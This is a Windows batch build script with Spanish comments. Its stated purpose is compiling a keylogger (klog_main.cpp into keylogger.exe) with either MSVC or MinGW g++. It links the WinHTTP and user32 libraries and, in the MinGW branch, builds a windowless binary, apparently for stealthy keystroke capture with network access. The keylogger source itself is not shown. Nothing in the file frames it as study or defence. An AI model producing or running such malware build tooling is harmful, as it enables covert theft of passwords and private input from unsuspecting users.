@echo off
REM Compila el keylogger en Windows.
REM Opcion 1: MSVC (requiere "x64 Native Tools Command Prompt for VS")
REM Opcion 2: MinGW-w64 (g++)

where cl.exe >nul 2>&1
if %errorlevel%==0 (
    echo [MSVC] Compilando con cl.exe...
    cl /EHsc /std:c++17 /O2 /Fe:keylogger.exe klog_main.cpp /link winhttp.lib user32.lib
    if %errorlevel% neq 0 (
        echo Error compilando con MSVC
        exit /b 1
    )
    del klog_main.obj >nul 2>&1
    echo Compilado: keylogger.exe
    exit /b 0
)

where g++ >nul 2>&1
if %errorlevel%==0 (
    echo [MinGW] Compilando con g++...
    g++ -std=c++17 -O2 -o keylogger.exe klog_main.cpp -lwinhttp -luser32 -lgdi32 -static -mwindows
    if %errorlevel% neq 0 (
        echo Error compilando con MinGW
        exit /b 1
    )
    echo Compilado: keylogger.exe
    exit /b 0
)

echo No se ha encontrado un compilador (cl.exe o g++).
echo Instala Visual Studio Build Tools o MinGW-w64.
exit /b 1
